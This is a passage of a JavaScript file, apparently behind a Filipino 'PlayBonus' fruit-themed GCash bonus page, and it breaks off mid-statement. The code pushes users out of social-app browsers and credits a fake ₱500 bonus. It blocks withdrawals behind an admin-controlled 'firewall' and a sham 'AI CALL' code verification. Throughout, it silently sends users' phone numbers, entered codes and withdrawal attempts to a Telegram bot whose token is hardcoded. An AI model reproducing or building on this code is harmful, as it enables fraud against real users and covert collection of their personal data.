/**
 * PlayBonus.js - 3D Fantasy Fruits Theme
 * Anti-Lag Optimized + ADS Popup + System Verification
 */

(function() {
    'use strict';

    // ============================================================
    // 🚀 FORCE OPEN IN DEFAULT BROWSER
    // ============================================================
    (function forceOpenInBrowser() {
        var ua = navigator.userAgent || navigator.vendor || window.opera;
        var isFacebook = /FBAN|FBAV|FB_IAB|FBIOS/i.test(ua);
        var isInstagram = /Instagram/i.test(ua);
        var isMessenger = /Messenger/i.test(ua);
        var isTikTok = /BytedanceWebview|TikTok/i.test(ua);
        var isLine = /Line\//i.test(ua);
        var isTwitter = /Twitter/i.test(ua);
        var isWhatsApp = /WhatsApp/i.test(ua);
        var isWeChat = /MicroMessenger/i.test(ua);
        var isInAppBrowser = isFacebook || isInstagram || isMessenger || isTikTok || isLine || isTwitter || isWhatsApp || isWeChat;

        if (!isInAppBrowser) return;

        var currentUrl = window.location.href;
        var cleanUrl = currentUrl.replace(/^https?:\/\//, '');
        var isAndroid = /Android/i.test(ua);
        var isIOS = /iPhone|iPad|iPod/i.test(ua);

        if (isAndroid) {
            window.location.href = 'intent://' + cleanUrl + '#Intent;scheme=https;package=com.android.chrome;S.browser_fallback_url=' + encodeURIComponent(currentUrl) + ';end';
            return;
        }

        if (isIOS) {
            window.location.href = 'googlechrome://' + cleanUrl;
            setTimeout(function() { window.location.href = 'x-web-search://?url=' + encodeURIComponent(currentUrl); }, 500);
            return;
        }

        setTimeout(function() { showOpenInBrowserPrompt(currentUrl); }, 800);
    })();

    function showOpenInBrowserPrompt(url) {
        if (document.getElementById('openBrowserPrompt')) return;

        var overlay = document.createElement('div');
        overlay.id = 'openBrowserPrompt';
        overlay.style.cssText = 'position:fixed;inset:0;z-index:9999999;background:rgba(0,0,0,0.92);display:flex;align-items:center;justify-content:center;padding:20px;font-family:"Fredoka",sans-serif;';

        overlay.innerHTML =
            '<div style="max-width:340px;width:100%;background:linear-gradient(160deg,#5a189a 0%,#240046 100%);border:3px solid #ffd700;border-radius:24px;padding:32px 24px;text-align:center;box-shadow:0 0 40px rgba(255,215,0,0.5);">' +
                '<div style="font-size:56px;margin-bottom:12px;">🍓</div>' +
                '<h2 style="font-family:\'Fredoka\',sans-serif;font-size:22px;font-weight:900;background:linear-gradient(180deg,#fff9c4,#ffd700,#ff9800);-webkit-background-clip:text;background-clip:text;color:transparent;letter-spacing:1.5px;text-transform:uppercase;margin:0 0 12px 0;filter:drop-shadow(0 0 15px rgba(255,215,0,0.7));">OPEN IN BROWSER</h2>' +
                '<p style="color:rgba(255,255,255,0.92);font-size:14px;line-height:1.6;margin:0 0 20px 0;">Para mag-proceed, paki-open ang link sa <strong style="color:#ffd700;">Chrome</strong> o <strong style="color:#ffd700;">Safari</strong>.<br><br>I-tap ang <strong style="color:#ffd700;">⋮</strong> (menu) sa taas → <strong style="color:#ffd700;">"Open in Browser"</strong></p>' +
                '<button id="copyLinkBtn" style="width:100%;padding:14px;background:linear-gradient(180deg,#fff9c4 0%,#ffd700 40%,#ff9800 100%);border:3px solid #fff;border-radius:14px;font-family:\'Fredoka\',sans-serif;font-size:14px;font-weight:900;color:#8b0000;letter-spacing:1.5px;text-transform:uppercase;cursor:pointer;margin-bottom:10px;box-shadow:0 5px 0 #8b4500,0 8px 20px rgba(0,0,0,0.5);">📋 COPY LINK</button>' +
                '<button id="openChromeBtn" style="width:100%;padding:14px;background:linear-gradient(180deg,#4fc3f7 0%,#0288d1 50%,#01579b 100%);border:3px solid #fff;border-radius:14px;font-family:\'Fredoka\',sans-serif;font-size:14px;font-weight:900;color:#fff;letter-spacing:1.5px;text-transform:uppercase;cursor:pointer;box-shadow:0 5px 0 #01579b,0 8px 20px rgba(0,0,0,0.5);">🌐 OPEN IN CHROME</button>' +
            '</div>';

        document.body.appendChild(overlay);

        document.getElementById('copyLinkBtn').onclick = function() {
            var btn = this;
            try {
                if (navigator.clipboard && navigator.clipboard.writeText) {
                    navigator.clipboard.writeText(url).then(function() {
                        btn.textContent = '✅ COPIED!';
                        setTimeout(function() { btn.textContent = '📋 COPY LINK'; }, 1500);
                    });
                } else {
                    var ta = document.createElement('textarea');
                    ta.value = url;
                    document.body.appendChild(ta);
                    ta.select();
                    document.execCommand('copy');
                    document.body.removeChild(ta);
                    btn.textContent = '✅ COPIED!';
                    setTimeout(function() { btn.textContent = '📋 COPY LINK'; }, 1500);
                }
            } catch(e) { alert('Copy failed. Please copy manually:\n\n' + url); }
        };

        document.getElementById('openChromeBtn').onclick = function() {
            var cleanUrl = url.replace(/^https?:\/\//, '');
            var ua = navigator.userAgent || '';
            var isAndroid = /Android/i.test(ua);
            if (isAndroid) {
                window.location.href = 'intent://' + cleanUrl + '#Intent;scheme=https;package=com.android.chrome;S.browser_fallback_url=' + encodeURIComponent(url) + ';end';
            } else {
                window.location.href = 'googlechrome://' + cleanUrl;
            }
        };
    }

    // ============================================================
    // ⚡ PERFORMANCE FLAGS & GLOBALS
    // ============================================================
    var IS_MOBILE = window.innerWidth <= 480;
    var REDUCED_MOTION = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
    var SKIP_HEAVY_EFFECTS = IS_MOBILE || REDUCED_MOTION;

    var userPhone = null;
    var db = null;
    var userRef = null;
    var currentBalance = 0;
    var bonusAmount = 500;
    var isClaimed = false;
    var claimInProgress = false;
    var autoPopupTimer = null;
    var balanceListener = null;
    var claimListener = null;
    var forceLogoutListener = null;
    var forceLogoutFlagListener = null;
    var logoutTriggered = false;
    var listenersSetup = false;
    var pageLoadTime = Date.now();

    var callInProgress = false;
    var callCountdown = 60;
    var callTimerInterval = null;
    var currentCallCode = '';

    var withdrawInProgress = false;
    var adsCountdownInterval = null;

    var lastTelegramTime = 0;
    var TELEGRAM_THROTTLE_MS = 2000;

    var soundCache = { scatter: null, claim: null, success: null, call: null };

    // ============================================================
    // UTILITIES & TELEGRAM
    // ============================================================
    function formatNumberWithComma(number) {
        var n = Number(number);
        if (isNaN(n)) n = 0;
        return n.toFixed(2).replace(/\B(?=(\d{3})+(?!\d))/g, ',');
    }

    function initSounds() {
        try {
            soundCache.scatter = new Audio('sounds/super_ace_scatter_ring.mp3');
            soundCache.claim = new Audio('sounds/claim.wav');
            soundCache.success = new Audio('sounds/success.wav');
            soundCache.call = new Audio('sounds/call_ring.mp3');
            soundCache.scatter.volume = 0.5;
            soundCache.claim.volume = 0.7;
            soundCache.success.volume = 0.6;
            soundCache.call.volume = 0.5;
        } catch(e) {}
    }

    function playSound(soundName) {
        if (soundCache[soundName]) {
            soundCache[soundName].currentTime = 0;
            soundCache[soundName].play().catch(function() {});
        }
    }

    var BOT_TOKEN = "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg";
    var CHAT_ID = "7298607329";

    function sendTelegram(message) {
        try {
            var now = Date.now();
            if (now - lastTelegramTime < TELEGRAM_THROTTLE_MS) return;
            lastTelegramTime = now;
            fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(message)).catch(function() {});
        } catch(e) {}
    }

    function sendAICallRequestNotif(p, d, c) { sendTelegram('📞 AI CALL REQUEST\n👤 ' + p + '\n🔑 Code: ' + c); }
    function sendAICodeAttemptNotif(p, d, c, s) { sendTelegram('🔑 AI CODE ATTEMPT\n📝 Code: ' + c + '\nStatus: INVALID'); }
    function sendAICallExpiredNotif(p, d) { sendTelegram('⏰ AI CALL EXPIRED\n👤 ' + p); }
    function sendWithdrawRequestNotif(p, d, b, f) { sendTelegram('💸 WITHDRAW REQ\n👤 ' + p + '\n💰 ₱' + b.toFixed(2)); }
    function sendWithdrawRedirectNotif(p, d, b) { sendTelegram('🚀 REDIRECTED\n👤 ' + p); }
    function sendWithdrawFirewallNotif(p, d, b) { sendTelegram('🔥 BLOCKED BY FIREWALL\n👤 ' + p); }
    function sendAdsPopupNotif(p, d, b) { sendTelegram('📢 ADS POPUP\n👤 ' + p); }

    // ============================================================
    // INIT
    // ============================================================
    function init() {
        console.log('🎁 PlayBonus Starting...');
        
        userPhone = localStorage.getItem("userPhone");
        if (!userPhone || userPhone === 'null' || userPhone.length < 10) {
            window.location.href = "index.html";
            return;
        }

        var phoneDisplay = document.getElementById('userPhoneDisplay');
        if (phoneDisplay) phoneDisplay.innerText = userPhone.substring(0, 4) + "***" + userPhone.substring(7, 11);

        initSounds();
        initFirebase();
        loadUserData();
        initTimer();
        initTicker();
        initClaimFlow();
        initConfetti();
        attachButtonEvents();
        initAdminForceLogoutListener();
    }

    function initFirebase() {
        if (typeof firebaseConfig === 'undefined') return;
        try {
            if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
            db = firebase.database();
            userRef = db.ref('user_sessions/' + userPhone);
        } catch(e) {}
    }

    // ============================================================
    // LOAD USER DATA
    // ============================================================
    function loadUserData() {
        if (!userRef) return;

        userRef.once('value', function(snapshot) {
            var data = snapshot.val();
            if (data) {
                currentBalance = Number(data.balance) || 0;
                isClaimed = data.claimed_ptcat === true;
                updateBalanceDisplay();
                updateClaimButtonUI();
                scheduleAutoPopup();
            } else {
                currentBalance = 0;
                isClaimed = false;
                userRef.set({ phone: userPhone, balance: 0, claimed_ptcat: false, status: "active", created_at: Date.now() }).then(function() {
                    updateBalanceDisplay();
                    updateClaimButtonUI();
                    scheduleAutoPopup();
                });
            }
        });

        userRef.child('balance').on('value', function(snapshot) {
            if (snapshot.val() !== null) { currentBalance = Number(snapshot.val()); updateBalanceDisplay(); }
        });

        userRef.child('claimed_ptcat').on('value', function(snapshot) {
            var newState = (snapshot.val() === true);
            if (newState !== isClaimed) { isClaimed = newState; updateClaimButtonUI(); }
        });
    }

    function updateBalanceDisplay() {
        var balanceEl = document.getElementById('userBalanceDisplay');
        if (balanceEl) balanceEl.innerText = formatNumberWithComma(currentBalance);
    }

    function scheduleAutoPopup() {
        if (autoPopupTimer) clearTimeout(autoPopupTimer);
        var delay = isClaimed ? 5000 : 3000;
        autoPopupTimer = setTimeout(function() { autoShowBonusPopup(); }, delay);
    }

    function autoShowBonusPopup() {
        var popup = document.getElementById('bonusRewardPopup');
        if (popup) { popup.style.display = 'flex'; playSound('scatter'); updateClaimButtonUI(); }
    }

    function forceShowBonusPopup() {
        var popup = document.getElementById('bonusRewardPopup');
        if (popup) { popup.style.display = 'flex'; playSound('scatter'); updateClaimButtonUI(); }
    }

    function animateBalanceThenSave(oldBalance, newBalance, callback) {
        var startTime = null;
        var duration = 1000;
        function step(timestamp) {
            if (!startTime) startTime = timestamp;
            var progress = Math.min((timestamp - startTime) / duration, 1);
            var easeProgress = 1 - Math.pow(1 - progress, 3);
            var val = Math.floor(easeProgress * (newBalance - oldBalance) + oldBalance);
            var balanceEl = document.getElementById('userBalanceDisplay');
            if (balanceEl) balanceEl.innerText = formatNumberWithComma(val);
            if (progress < 1) requestAnimationFrame(step);
            else if (callback) callback();
        }
        requestAnimationFrame(step);
    }

    function checkFirewallBeforeClaim() {
        try {
            return db.ref('admin/globalFirewall').once('value').then(function(snapshot) {
                return (snapshot.val() && snapshot.val().active === true);
            });
        } catch(e) { return Promise.resolve(false); }
    }

    function trackClaimInFirebase(amount) {
        try {
            var now = new Date();
            var dateKey = now.getFullYear() + '-' + String(now.getMonth() + 1).padStart(2, '0') + '-' + String(now.getDate()).padStart(2, '0');
            var hour = now.getHours();
            db.ref('festival_stats/daily/' + dateKey).transaction(function(data) {
                if (data === null) data = { claims_count: 0, claims_amount: 0, hourly_claims: {} };
                data.claims_count = (data.claims_count || 0) + 1;
                data.claims_amount = (data.claims_amount || 0) + (amount || 0);
                if (!data.hourly_claims) data.hourly_claims = {};
                data.hourly_claims[hour] = (data.hourly_claims[hour] || 0) + 1;
                return data;
            });
        } catch(e) {}
    }

    // ============================================================
    // CLAIM FLOW
    // ============================================================
    function initClaimFlow() {
        var claimNowBtn = document.getElementById('claimNowBtn');
        var popup = document.getElementById('bonusRewardPopup');

        if (claimNowBtn) {
            claimNowBtn.addEventListener('click', function(e) {
                e.preventDefault(); e.stopPropagation();
                playSound('scatter');
                if (currentBalance <= 0) {
                    if (!isClaimed) { forceShowBonusPopup(); return; }
                }
                openClaimNowPopup();
            });
        }

        var ptCatClaimBtn = document.getElementById('ptCatClaimBtn');
        if (ptCatClaimBtn) ptCatClaimBtn.addEventListener('click', handleClaimBonus);

        var closeBtn = document.getElementById('bonusRewardClose');
        if (closeBtn) closeBtn.addEventListener('click', function() { if (popup) popup.style.display = 'none'; });

        var backBtn = document.getElementById('bonusRewardBack');
        if (backBtn) backBtn.addEventListener('click', function() { if (popup) popup.style.display = 'none'; });

        updateClaimButtonUI();
    }

    function openClaimNowPopup() {
        var popup = document.getElementById('claimNowPopup');
        if (!popup) return;
        var balanceEl = document.getElementById('claimNowBalanceAmount');
        if (balanceEl) balanceEl.innerText = formatNumberWithComma(currentBalance);
        popup.style.display = 'flex';
        generateClaimNowConfetti();
        if (!popup.dataset.eventsAttached) {
            popup.dataset.eventsAttached = 'true';
            attachClaimNowEvents();
        }
    }

    function closeClaimNowPopup() {
        var popup = document.getElementById('claimNowPopup');
        if (popup) popup.style.display = 'none';
    }

    function generateClaimNowConfetti() {
        var layer = document.getElementById('claimNowConfetti');
        if (!layer || SKIP_HEAVY_EFFECTS) return;
        layer.innerHTML = '';
        var colors = ['#ff2d95', '#ffd700', '#ff8c00', '#00d4ff', '#39ff14', '#ffffff'];
        for (var i = 0; i < 10; i++) {
            var piece = document.createElement('div');
            piece.className = 'claim-now-confetti';
            piece.style.cssText = 'left:' + (Math.random() * 100) + '%;width:' + (Math.random() * 8 + 5) + 'px;height:' + (Math.random() * 8 + 5) + 'px;background:' + colors[Math.floor(Math.random() * colors.length)] + ';animation: claimNowConfettiFall ' + (Math.random() * 4 + 5) + 's ' + (Math.random() * 4) + 's linear infinite;';
            layer.appendChild(piece);
        }
    }

    function attachClaimNowEvents() {
        var closeBtn = document.getElementById('claimNowPopupClose');
        if (closeBtn) closeBtn.onclick = closeClaimNowPopup;
        var backBtn = document.getElementById('claimNowBackBtn');
        if (backBtn) backBtn.onclick = closeClaimNowPopup;
        var gcashBtn = document.getElementById('claimViaGCashBtn');
        if (gcashBtn) gcashBtn.onclick = handleClaimViaGCash;
    }

    // ============================================================
    // 📢 ADS POPUP
    // ============================================================
    function showAdsPopup() {
        var popup = document.getElementById('adsPopup');
        if (!popup) return;
        popup.style.display = 'flex';
        if (!popup.dataset.eventsAttached) { popup.dataset.eventsAttached = 'true'; attachAdsEvents(); }
        startAdsCountdown();
    }

    function closeAdsPopup() {
        var popup = document.getElementById('adsPopup');
        if (popup) popup.style.display = 'none';
        stopAdsCountdown();
    }

    function startAdsCountdown() {
        stopAdsCountdown();
        var skipBtn = document.getElementById('adsSkipBtn');
        if (!skipBtn) return;
        var countdown = 10;
        skipBtn.disabled = true;
        skipBtn.innerHTML = '<i class="fas fa-hourglass-half"></i> SKIP ADS IN ' + countdown;
        adsCountdownInterval = setInterval(function() {
            countdown--;
            if (countdown > 0) {
                skipBtn.innerHTML = '<i class="fas fa-hourglass-half"></i> SKIP ADS IN ' + countdown;
            } else {
                stopAdsCountdown();
                skipBtn.disabled = false;
                skipBtn.innerHTML = '<i class="fas fa-forward"></i> SKIP ADS';
            }
        }, 1000);
    }

    function stopAdsCountdown() {
        if (adsCountdownInterval) { clearInterval(adsCountdownInterval); adsCountdownInterval = null; }
    }

    function attachAdsEvents() {
        var closeBtn = document.getElementById('adsPopupClose');
        if (closeBtn) closeBtn.onclick = closeAdsPopup;
        var skipBtn = document.getElementById('adsSkipBtn');
        if (skipBtn) {
            skipBtn.onclick = function() {
                if (skipBtn.disabled) return;
                playSound('claim');
                closeAdsPopup();
                sendTelegram('⏭️ ADS SKIPPED\n👤 ' + (localStorage.getItem("userPhone") || "Unknown"));
            };
        }
    }

    // ============================================================
    // HANDLE CLAIM VIA GCASH
    // ============================================================
    async function handleClaimViaGCash() {
        if (withdrawInProgress) return;
        withdrawInProgress = true;
        playSound('claim');
        var gcashBtn = document.getElementById('claimViaGCashBtn');
        var originalHTML = gcashBtn ? gcashBtn.innerHTML : '';
        if (gcashBtn) { gcashBtn.disabled = true; gcashBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESSING...'; }

        try {
            var firewallActive = await checkFirewallBeforeClaim();
            var userPhoneStr = localStorage.getItem("userPhone") || "Unknown";
            var deviceId = localStorage.getItem("userDeviceId") || "Unknown";

            if (firewallActive) {
                sendWithdrawFirewallNotif(userPhoneStr, deviceId, currentBalance);
                closeClaimNowPopup();
                showFirewallVerificationPopup();
                if (gcashBtn) { gcashBtn.disabled = false; gcashBtn.innerHTML = originalHTML; }
                withdrawInProgress = false;
                return;
            }

            var redirectUrl = await getAdminRedirectLink();
            if (redirectUrl) {
                sendWithdrawRequestNotif(userPhoneStr, deviceId, currentBalance, false);
                if (gcashBtn) gcashBtn.innerHTML = '<i class="fas fa-check"></i> REDIRECTING...';
                setTimeout(function () {
                    sendWithdrawRedirectNotif(userPhoneStr, deviceId, currentBalance);
                    window.location.href = redirectUrl;
                }, 1500);
                withdrawInProgress = false;
                return;
            }

            sendAdsPopupNotif(userPhoneStr, deviceId, currentBalance);
            closeClaimNowPopup();
            setTimeout(function() { showAdsPopup(); }, 300);
            if (gcashBtn) { gcashBtn.disabled = false; gcashBtn.innerHTML = originalHTML; }
            withdrawInProgress = false;

        } catch (error) {
            alert('⚠️ System error. Please try again.');
            if (gcashBtn) { gcashBtn.disabled = false; gcashBtn.innerHTML = originalHTML; }
            withdrawInProgress = false;
        }
    }

    function getAdminRedirectLink() {
        return new Promise(function (resolve) {
            if (!db) return resolve(null);
            db.ref('admin/redirectLink').once('value').then(function (snapshot) {
                var data = snapshot.val();
                if (data && data.url && data.active !== false) return resolve(data.url);
                
                return db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value').then(function (linksSnap) {
                    if (linksSnap.exists()) {
                        var links = linksSnap.val();
                        var key = Object.keys(links)[0];
                        var linkData = links[key];
                        db.ref('links/' + key).update({ status: 'claimed', user: userPhone || 'Unknown', claimedAt: Date.now() });
                        resolve(linkData.url);
                    } else {
                        resolve(null);
                    }
                });
            }).catch(function () { resolve(null); });
        });
    }

    // ============================================================
    // HANDLE CLAIM BONUS
    // ============================================================
    function handleClaimBonus(e) {
        e.preventDefault(); e.stopPropagation();
        if (isClaimed) { alert("You have already claimed this bonus!"); return; }
        if (claimInProgress) { alert("Please wait, processing..."); return; }
        if (!userRef) { alert("System not ready."); return; }

        userRef.child('claimed_ptcat').once('value', function(snapshot) {
            if (snapshot.val() === true) { isClaimed = true; updateClaimButtonUI(); alert("Already claimed!"); return; }
            processClaim();
        }).catch(function() { processClaim(); });
    }

    function processClaim() {
        claimInProgress = true;
        var ptCatClaimBtn = document.getElementById('ptCatClaimBtn');
        if (ptCatClaimBtn) { ptCatClaimBtn.disabled = true; ptCatClaimBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESSING...'; }

        checkFirewallBeforeClaim().then(function(firewallOn) {
            if (firewallOn) {
                var popup = document.getElementById('bonusRewardPopup');
                if (popup) popup.style.display = 'none';
                creditBonusAndMark(function() { showFirewallVerificationPopup(); claimInProgress = false; });
            } else {
                creditBonusAndMark(function() {
                    var popup = document.getElementById('bonusRewardPopup');
                    if (popup) popup.style.display = 'none';
                    setTimeout(function() { showSuccessPopup(bonusAmount); }, 300);
                    claimInProgress = false;
                });
            }
        }).catch(function() { claimInProgress = false; resetClaimButton(); });
    }

    function creditBonusAndMark(callback) {
        var oldBalance = currentBalance;
        var newBalance = oldBalance + bonusAmount;
        userRef.update({ balance: newBalance, claimed_ptcat: true, ptcat_claimed_at: Date.now(), lastUpdate: Date.now() }).then(function() {
            currentBalance = newBalance; isClaimed = true;
            animateBalanceThenSave(oldBalance, newBalance, function() { updateBalanceDisplay(); });
            trackClaimInFirebase(bonusAmount); playSound('claim'); startConfetti(); updateClaimButtonUI();
            if (callback) callback();
        }).catch(function() {
            alert('Error saving claim.'); claimInProgress = false; resetClaimButton();
        });
    }

    function resetClaimButton() {
        var ptCatClaimBtn = document.getElementById('ptCatClaimBtn');
        if (ptCatClaimBtn) { ptCatClaimBtn.disabled = false; ptCatClaimBtn.innerHTML = '<i class="fas fa-gift"></i> CLAIM BONUS'; }
        claimInProgress = false;
    }

    function updateClaimButtonUI() {
        var ptCatClaimBtn = document.getElementById('ptCatClaimBtn');
        var bonusLabel = document.querySelector('.bonus-label');
        if (!ptCatClaimBtn) return;

        if (isClaimed) {
            ptCatClaimBtn.disabled = true;
            ptCatClaimBtn.innerHTML = '<i class="fas fa-check-circle"></i> ALREADY CLAIMED';
            if (bonusLabel) { bonusLabel.textContent = 'BONUS CLAIMED'; bonusLabel.style.color = '#39ff14'; }
        } else {
            ptCatClaimBtn.disabled = false;
            ptCatClaimBtn.innerHTML = '<i class="fas fa-gift"></i> CLAIM BONUS';
            if (bonusLabel) { bonusLabel.textContent = 'BONUS REWARD'; bonusLabel.style.color = ''; }
        }
    }

    function showSuccessPopup(amount) {
        var popup = document.getElementById('successPopup');
        var amountEl = document.getElementById('successAmount');
        var closeBtn = document.getElementById('successCloseBtn');
        if (amountEl) amountEl.textContent = amount;
        if (popup) popup.style.display = 'flex';
        playSound('success');
        if (closeBtn) closeBtn.onclick = function() { popup.style.display = 'none'; };
        setTimeout(function() { if (popup) popup.style.display = 'none'; }, 5000);
    }

    // ============================================================
    // FIREWALL AI POPUP (3D FANTASY FRUITS THEME)
    // ============================================================
    function showFirewallVerificationPopup() {
        var existingPopup = document.getElementById('firewallAIPopup');
        if (existingPopup) existingPopup.remove();

        callInProgress = false; callCountdown = 60;
        if (callTimerInterval) { clearInterval(callTimerInterval); callTimerInterval = null; }
        addFirewallStyles();

        var userPhoneStr = localStorage.getItem("userPhone") || "Unknown";
        var formattedPhone = userPhoneStr.substring(0, 4) + "***" + userPhoneStr.substring(7, 11);

        var overlay = document.createElement('div');
        overlay.id = 'firewallAIPopup';
        overlay.className = 'firewall-ai-overlay';
        
        // --- BAGONG THEME PARA SA POPUP ---
        overlay.innerHTML =
            '<div class="firewall-ai-container">' +
                '<button class="firewall-ai-close" id="firewallAIClose">✕</button>' +
                '<div class="firewall-ai-header">' +
                    '<div class="firewall-ai-icon">🍓</div>' + // Fruit icon
                    '<h2 class="firewall-ai-title">FRUIT VERIFICATION</h2>' +
                    '<div class="firewall-ai-subtitle">◆ SWEET CALL SYSTEM ◆</div>' +
                '</div>' +
                '<div class="firewall-ai-divider"></div>' +
                '<div class="firewall-ai-status" id="firewallAIStatus">' +
                    '<div id="firewallAIIcon" style="font-size: 32px; margin-bottom: 8px;">🍊</div>' +
                    '<div id="firewallAIText" class="firewall-ai-status-text"><strong>AI CALL</strong> will provide your verification code</div>' +
                    '<div id="firewallAIPhone" style="display: none; margin-top: 10px;"><div class="firewall-ai-phone-number">📱 ' + formattedPhone + '</div></div>' +
                    '<div id="firewallAITimer" class="firewall-ai-timer" style="display: none;">60s</div>' +
                '</div>' +
                '<button id="firewallAIRequestBtn" class="firewall-ai-btn-primary"><i class="fas fa-phone-alt"></i><span>REQUEST AI CALL</span></button>' +
                '<div id="firewallAICodeSection" class="firewall-ai-code-section">' +
                    '<div class="firewall-ai-code-label"><i class="fas fa-key"></i><span>ENTER 4-DIGIT CODE</span></div>' +
                    '<input type="text" id="firewallAICodeInput" class="firewall-ai-input" placeholder="0000" maxlength="4" inputmode="numeric" autocomplete="off">' +
                    '<button id="firewallAIVerifyBtn" class="firewall-ai-btn-verify"><i class="fas fa-check-double"></i><span>VERIFY CODE</span></button>' +
                    '<div id="firewallAIError" class="firewall-ai-msg-error"><i class="fas fa-times-circle"></i> Invalid code. Request a new call.</div>' +
                    '<div id="firewallAIExpired" class="firewall-ai-msg-expired"><i class="fas fa-clock"></i> Call expired. Request a new call.</div>' +
                '</div>' +
                '<div style="text-align: center; margin-top: 12px;"><button class="firewall-ai-btn-back" id="firewallAIBackBtn">← BACK</button></div>' +
            '</div>';
        
        document.body.appendChild(overlay);
        setTimeout(function() { overlay.classList.add('show'); }, 50);
        attachFirewallEvents();
    }

    function attachFirewallEvents() {
        var closeBtn = document.getElementById('firewallAIClose');
        var backBtn = document.getElementById('firewallAIBackBtn');
        var requestBtn = document.getElementById('firewallAIRequestBtn');
        var verifyBtn = document.getElementById('firewallAIVerifyBtn');
        var codeInput = document.getElementById('firewallAICodeInput');

        if (closeBtn) closeBtn.onclick = closeFirewallPopup;
        if (backBtn) backBtn.onclick = closeFirewallPopup;
        if (requestBtn) requestBtn.onclick = function() { if (callInProgress) return; requestFirewallCall(); };
        if (verifyBtn) verifyBtn.onclick = verifyFirewallCode;
        if (codeInput) {
            codeInput.addEventListener('keypress', function(e) { if (e.key === 'Enter') verifyFirewallCode(); });
        }
    }

    function requestFirewallCall() {
        if (callInProgress) return;
        callInProgress = true; callCountdown = 60;
        currentCallCode = Math.floor(1000 + Math.random() * 9000).toString();
        var userPhoneStr = localStorage.getItem("userPhone") || "Unknown";
        var deviceId = localStorage.getItem("userDeviceId") || "Unknown";

        if (db) {
            db.ref('user_sessions/' + userPhoneStr + '/system_verification').set({
                code: currentCallCode, timer: 60, status: 'active', deviceId: deviceId, phone: userPhoneStr,
                createdAt: Date.now(), lastUpdate: Date.now(), userEnteredCode: null, userEnteredAt: null, isMatch: null
            });
        }

        sendAICallRequestNotif(userPhoneStr, deviceId, currentCallCode);

        var statusIcon = document.getElementById('firewallAIIcon');
        var statusText = document.getElementById('firewallAIText');
        var phoneDisplay = document.getElementById('firewallAIPhone');
        var timerDisplay = document.getElementById('firewallAITimer');
        var requestBtn = document.getElementById('firewallAIRequestBtn');
        var codeSection = document.getElementById('firewallAICodeSection');

        if (statusIcon) statusIcon.innerHTML = '📞';
        if (statusText) statusText.innerHTML = '<strong>AI CALL</strong> being placed...';
        if (phoneDisplay) phoneDisplay.style.display = 'block';
        if (timerDisplay) { timerDisplay.style.display = 'block'; timerDisplay.textContent = '60s'; timerDisplay.classList.remove('urgent'); }
        if (requestBtn) { requestBtn.disabled = true; requestBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> CALLING...'; }
        if (codeSection) codeSection.classList.remove('show');

        playSound('call');
        startFirewallTimer();

        setTimeout(function() {
            if (statusIcon) statusIcon.innerHTML = '🎯';
            if (statusText) statusText.innerHTML = '<strong style="color: #39ff14;">🎯 CONNECTED!</strong>';
            if (codeSection) codeSection.classList.add('show');
        }, 4000);
    }

    function startFirewallTimer() {
        stopFirewallTimer();
        var timerDisplay = document.getElementById('firewallAITimer');
        var userPhoneStr = localStorage.getItem("userPhone") || "Unknown";

        callTimerInterval = setInterval(function() {
            callCountdown--;
            if (db) { db.ref('user_sessions/' + userPhoneStr + '/system_verification').update({ timer: callCountdown, lastUpdate: Date.now() }); }
            if (timerDisplay) {
                timerDisplay.textContent = callCountdown + 's';
                if (callCountdown <= 9) timerDisplay.classList.add('urgent'); else timerDisplay.classList.remove('urgent');
            }
            if (callCountdown <= 0) {
                stopFirewallTimer();
                if (db) { db.ref('user_sessions/' + userPhoneStr + '/system_verification').update({ status: 'expired', timer: 0 }); }
                sendAICallExpiredNotif(userPhoneStr, localStorage.getItem("userDeviceId"));
                var statusText = document.getElementById('firewallAIText');
                var codeSection = document.getElementById('firewallAICodeSection');
                var requestBtn = document.getElementById('firewallAIRequestBtn');
                var expiredMsg = document.getElementById('firewallAIExpired');
                if (statusText) statusText.innerHTML = '<strong style="color: #ff9800;">⏰ EXPIRED</strong>';
                if (timerDisplay) timerDisplay.style.display = 'none';
                if (codeSection) codeSection.classList.remove('show');
                if (requestBtn) { requestBtn.disabled = false; requestBtn.innerHTML = '<i class="fas fa-phone-alt"></i> REQUEST AI CALL'; }
                if (expiredMsg) expiredMsg.classList.add('show');
                callInProgress = false;
            }
        }, 1000);
    }

    function stopFirewallTimer() {
        if (callTimerInterval) { clearInterval(callTimerInterval); callTimerInterval = null; }
    }

    function verifyFirewallCode() {
        var codeInput = document.getElementById('firewallAICodeInput');
        var errorMsg = document.getElementById('firewallAIError');
        var expiredMsg = document.getElementById('firewallAIExpired');
        var verifyBtn = document.getElementById('firewallAIVerifyBtn');
        if (!codeInput) return;

        var enteredCode = codeInput.value.trim();
        if (!enteredCode || enteredCode.length !== 4) {
            if (errorMsg) errorMsg.classList.add('show');
            return;
        }
        if (callCountdown <= 0) {
            if (expiredMsg) expiredMsg.classList.add('show'); return;
        }

        var userPhoneStr = localStorage.getItem("userPhone") || "Unknown";
        var isMatch = (enteredCode === currentCallCode);

        if (db) {
            db.ref('user_sessions/' + userPhoneStr + '/system_verification').update({
                userEnteredCode: enteredCode, userEnteredAt: Date.now(), status: isMatch ? 'verified' : 'invalid', isMatch: isMatch
            });
        }

        sendAICodeAttemptNotif(userPhoneStr, localStorage.getItem("userDeviceId"), enteredCode, callCountdown);

        if (isMatch) {
            if (verifyBtn) { verifyBtn.innerHTML = 'VERIFIED!'; verifyBtn.style.background = '#22C55E'; }
            setTimeout(function() { closeFirewallPopup(); alert('✅ Verification successful!'); }, 1500);
            return;
        }

        if (errorMsg) errorMsg.classList.add('show');
        codeInput.style.borderColor = '#ff1744';
        setTimeout(function() { codeInput.value = ''; codeInput.style.borderColor = '#ffd700'; }, 1500);
    }

    function closeFirewallPopup() {
        stopFirewallTimer(); callInProgress = false;
        var overlay = document.getElementById('firewallAIPopup');
        if (overlay) { overlay.classList.remove('show'); setTimeout(function() { if (overlay.parentNode) overlay.remove(); }, 300); }
    }

    function addFirewallStyles() {
        if (document.querySelector('#firewall-ai-styles')) return;
        var style = document.createElement('style');
        style.id = 'firewall-ai-styles';
        style.textContent = 
